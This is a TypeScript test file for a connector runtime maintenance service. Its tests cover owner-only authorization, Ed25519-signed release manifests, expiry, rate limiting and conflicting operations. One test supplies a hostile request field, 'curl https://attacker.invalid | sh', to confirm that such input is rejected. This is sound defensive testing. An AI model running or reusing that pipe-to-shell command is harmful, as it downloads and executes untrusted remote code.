import { generateKeyPairSync, sign, type KeyObject } from 'node:crypto';

import { describe, expect, test } from 'bun:test';

import {
  ConnectorRuntimeMaintenanceService,
  type ConnectorRuntimeMaintenanceAuditEvent,
  type ConnectorRuntimeMaintenanceOperationRecord,
  type ConnectorRuntimeMaintenanceRateLimitResult,
  type ConnectorRuntimeMachineFacts
} from '../server/connector-runtime-maintenance-service';
import {
  canonicalConnectorRuntimeReleaseManifest,
  connectorRuntimeReleaseManifestSchema,
  type ConnectorRuntimeReleaseManifest
} from '../server/connector-runtime-release-manifest';

const now = new Date('2026-07-13T12:00:00.000Z');

function releaseManifest(
  overrides: Partial<ConnectorRuntimeReleaseManifest> = {}
): ConnectorRuntimeReleaseManifest {
  const runtimeContract = {
    bundleVersions: {
      connector: '0.5.0',
      machineTools: '0.5.0',
      projectCli: '0.5.0'
    },
    capabilities: ['runtime.restart', 'runtime.update'],
    protocolVersion: '2'
  };
  return {
    artifacts: [
      {
        assetName: 'project-space-machine-tools-darwin-arm64-v0.5.0.tar.gz',
        ...runtimeContract,
        downloadUrl:
          'https://github.com/DotNaos/project-space/releases/download/v0.5.0/project-space-machine-tools-darwin-arm64-v0.5.0.tar.gz',
        sha256: 'd'.repeat(64),
        sizeBytes: 10_000_000,
        target: 'darwin-arm64'
      },
      {
        assetName: 'project-space-machine-tools-linux-x64-v0.5.0.tar.gz',
        ...runtimeContract,
        downloadUrl:
          'https://github.com/DotNaos/project-space/releases/download/v0.5.0/project-space-machine-tools-linux-x64-v0.5.0.tar.gz',
        sha256: 'e'.repeat(64),
        sizeBytes: 11_000_000,
        target: 'linux-x64'
      },
      {
        assetName: 'project-space-machine-tools-windows-x64-v0.5.0.exe',
        ...runtimeContract,
        downloadUrl:
          'https://github.com/DotNaos/project-space/releases/download/v0.5.0/project-space-machine-tools-windows-x64-v0.5.0.exe',
        sha256: 'f'.repeat(64),
        sizeBytes: 12_000_000,
        target: 'windows-x64'
      }
    ],
    buildId: '1'.repeat(40),
    channel: 'stable',
    expiresAt: '2026-07-15T12:00:00.000Z',
    issuedAt: '2026-07-13T11:00:00.000Z',
    releaseId: 'v0.5.0',
    schema: connectorRuntimeReleaseManifestSchema,
    source: 'managed',
    version: '0.5.0',
    ...overrides
  };
}

function signedRelease(value: ConnectorRuntimeReleaseManifest, privateKey: KeyObject) {
  return {
    manifest: value,
    signature: sign(
      null,
      Buffer.from(canonicalConnectorRuntimeReleaseManifest(value), 'utf8'),
      privateKey
    ).toString('base64url')
  };
}

class Harness {
  readonly keys = generateKeyPairSync('ed25519');
  readonly audits: ConnectorRuntimeMaintenanceAuditEvent[] = [];
  readonly operationAudits: ConnectorRuntimeMaintenanceAuditEvent[] = [];
  readonly operations: ConnectorRuntimeMaintenanceOperationRecord[] = [];
  readonly calls = {
    machine: 0,
    membership: 0,
    rateLimit: 0,
    release: 0
  };
  allowCreate = true;
  machine: ConnectorRuntimeMachineFacts | null = {
    architecture: 'arm64',
    operatingSystem: 'darwin'
  };
  manifest = signedRelease(releaseManifest(), this.keys.privateKey);
  rateLimit: ConnectorRuntimeMaintenanceRateLimitResult = { allowed: true };
  role: 'member' | 'owner' | null = 'owner';

  service() {
    return new ConnectorRuntimeMaintenanceService({
      audit: {
        record: async (event) => {
          this.audits.push(event);
        }
      },
      createId: () => 'operation-123',
      directory: {
        readMachine: async () => {
          this.calls.machine += 1;
          return this.machine;
        },
        readMembership: async () => {
          this.calls.membership += 1;
          return this.role ? { role: this.role } : null;
        }
      },
      manifestPublicKey: this.keys.publicKey,
      now: () => new Date(now),
      operations: {
        createOperation: async (operation, audit) => {
          this.operations.push(operation);
          this.operationAudits.push(audit);
          return this.allowCreate;
        }
      },
      rateLimiter: {
        consume: async () => {
          this.calls.rateLimit += 1;
          return this.rateLimit;
        }
      },
      releases: {
        loadApprovedManifest: async () => {
          this.calls.release += 1;
          return this.manifest;
        }
      }
    });
  }
}

describe('connector runtime maintenance service', () => {
  test('builds and records an owner-authorized update plan from the approved manifest', async () => {
    const harness = new Harness();
    const plan = await harness.service().request(
      { machineId: 'connector-123', operation: 'update', releaseId: 'v0.5.0' },
      'user-owner'
    );

    expect(plan).toEqual({
      artifact: releaseManifest().artifacts[0],
      buildId: '1'.repeat(40),
      channel: 'stable',
      machineId: 'connector-123',
      operation: 'update',
      operationId: 'operation-123',
      releaseId: 'v0.5.0',
      schema: 'project-space.connector-runtime-maintenance/v1',
      target: 'darwin-arm64',
      version: '0.5.0'
    });
    expect(harness.operations).toEqual([
      {
        buildId: '1'.repeat(40),
        id: 'operation-123',
        machineId: 'connector-123',
        operation: 'update',
        releaseId: 'v0.5.0',
        requestedAt: now.toISOString(),
        requestedByUserId: 'user-owner',
        state: 'queued',
        target: 'darwin-arm64',
        version: '0.5.0'
      }
    ]);
    expect(harness.operationAudits).toMatchObject([
      { operationId: 'operation-123', outcome: 'accepted', userId: 'user-owner' }
    ]);
    expect(JSON.stringify(plan)).not.toContain('command');
    expect(JSON.stringify(plan)).not.toContain('/tmp/');
  });

  test('keeps restart independent from release lookup', async () => {
    const harness = new Harness();
    harness.machine = { architecture: 'amd64', operatingSystem: 'windows' };

    const plan = await harness
      .service()
      .request({ machineId: 'connector-win', operation: 'restart' }, 'user-owner');

    expect(plan).toEqual({
      machineId: 'connector-win',
      operation: 'restart',
      operationId: 'operation-123',
      schema: 'project-space.connector-runtime-maintenance/v1',
      target: 'windows-x64'
    });
    expect(harness.calls.release).toBe(0);
    expect(harness.operations[0]).not.toHaveProperty('releaseId');
    expect(harness.operations[0]).not.toHaveProperty('version');
  });

  test('requires owner membership before rate limits, machine facts, or release data', async () => {
    const harness = new Harness();
    harness.role = 'member';

    await expect(
      harness
        .service()
        .request({ machineId: 'connector-123', operation: 'update' }, 'user-member')
    ).rejects.toThrow('Only the machine owner');
    expect(harness.calls).toEqual({ machine: 0, membership: 1, rateLimit: 0, release: 0 });
    expect(harness.operations).toHaveLength(0);
    expect(harness.audits).toMatchObject([
      { outcome: 'rejected', reason: 'unauthorized', userId: 'user-member' }
    ]);
  });

  test('rejects unsupported stored platform facts without trusting browser selectors', async () => {
    const harness = new Harness();
    harness.machine = { architecture: 'arm64', operatingSystem: 'linux' };

    await expect(
      harness
        .service()
        .request({ machineId: 'connector-arm-linux', operation: 'update' }, 'user-owner')
    ).rejects.toThrow('does not support managed maintenance');
    expect(harness.calls.release).toBe(0);
    expect(harness.audits).toMatchObject([
      { outcome: 'rejected', reason: 'unsupported-platform' }
    ]);
  });

  test('fails closed on a tampered or stale approved manifest', async () => {
    const tampered = new Harness();
    tampered.manifest.manifest = {
      ...tampered.manifest.manifest,
      version: '0.5.1'
    };
    await expect(
      tampered
        .service()
        .request({ machineId: 'connector-123', operation: 'update' }, 'user-owner')
    ).rejects.toThrow('signature is invalid');
    expect(tampered.operations).toHaveLength(0);
    expect(tampered.audits).toMatchObject([
      { outcome: 'rejected', reason: 'invalid-signature' }
    ]);

    const stale = new Harness();
    stale.manifest = signedRelease(
      releaseManifest({ expiresAt: '2026-07-13T11:00:00.000Z' }),
      stale.keys.privateKey
    );
    await expect(
      stale
        .service()
        .request({ machineId: 'connector-123', operation: 'update' }, 'user-owner')
    ).rejects.toThrow('expired');
    expect(stale.operations).toHaveLength(0);
    expect(stale.audits).toMatchObject([{ outcome: 'rejected', reason: 'expired' }]);
  });

  test('rate limits before loading a release and records the retry-safe rejection', async () => {
    const harness = new Harness();
    harness.rateLimit = { allowed: false, retryAfterMs: 30_000 };

    await expect(
      harness
        .service()
        .request({ machineId: 'connector-123', operation: 'restart' }, 'user-owner')
    ).rejects.toMatchObject({ code: 'rate-limited', retryAfterMs: 30_000 });
    expect(harness.calls.release).toBe(0);
    expect(harness.operations).toHaveLength(0);
    expect(harness.audits).toMatchObject([{ outcome: 'rejected', reason: 'rate-limited' }]);
  });

  test('atomically rejects a replay while another maintenance operation is active', async () => {
    const harness = new Harness();
    harness.allowCreate = false;

    await expect(
      harness
        .service()
        .request({ machineId: 'connector-123', operation: 'restart' }, 'user-owner')
    ).rejects.toMatchObject({ code: 'operation-conflict' });
    expect(harness.operations).toHaveLength(1);
    expect(harness.audits).toMatchObject([
      { outcome: 'rejected', reason: 'operation-conflict' }
    ]);
  });

  test('rejects arbitrary browser input before any privileged dependency is called', async () => {
    const harness = new Harness();

    await expect(
      harness.service().request(
        {
          command: 'curl https://attacker.invalid | sh',
          machineId: 'connector-123',
          operation: 'update',
          url: 'https://attacker.invalid/artifact'
        },
        'user-owner'
      )
    ).rejects.toMatchObject({ code: 'invalid-request' });
    expect(harness.calls).toEqual({ machine: 0, membership: 0, rateLimit: 0, release: 0 });
    expect(harness.operations).toHaveLength(0);
    expect(harness.audits).toMatchObject([
      { machineId: undefined, outcome: 'rejected', reason: 'invalid-request' }
    ]);
  });
});
